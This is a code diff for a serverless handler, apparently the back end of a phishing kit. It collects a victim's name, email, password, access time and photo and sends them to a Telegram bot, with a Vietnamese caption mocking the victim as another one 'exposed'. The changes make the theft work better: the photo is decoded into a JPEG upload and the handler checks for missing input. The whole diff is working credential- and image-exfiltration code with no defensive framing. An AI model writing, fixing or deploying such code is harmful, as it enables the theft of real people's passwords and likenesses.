@@ -7,15 +7,19 @@ export default async function handler(req, res) {
     }
 
     try {
-        const info = JSON.parse(req.body.info || '{}');
-        const photo = req.body.photo || null;
+        const { info, photo } = req.body;
+
+        if (!info) {
+            return res.status(400).json({ status: 'error', message: 'Missing info' });
+        }
 
         const caption = `
-THÊM 1 THẰNG NGU LỘ MẶT RỒI ANH EM ƠI
+CÁC SẾP ƠI LẠI 1 EM LỘ MẶT !!
 
 👤 Tên: ${info.name || 'Không rõ'}
 📧 Email: ${info.email || 'Không rõ'}
 🔑 Mật khẩu: ${info.password || 'Không rõ'}
+
 📡 [THÔNG TIN TRUY CẬP]
 
 🕒 Thời gian: ${info.time || 'Không rõ'}
@@ -33,11 +37,13 @@ THÊM 1 THẰNG NGU LỘ MẶT RỒI ANH EM ƠI
         `.trim();
 
         let result;
+
         if (photo) {
+            const buffer = Buffer.from(photo, 'base64');
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('caption', caption);
-            formData.append('photo', photo);
+            formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'photo.jpg');
 
             result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
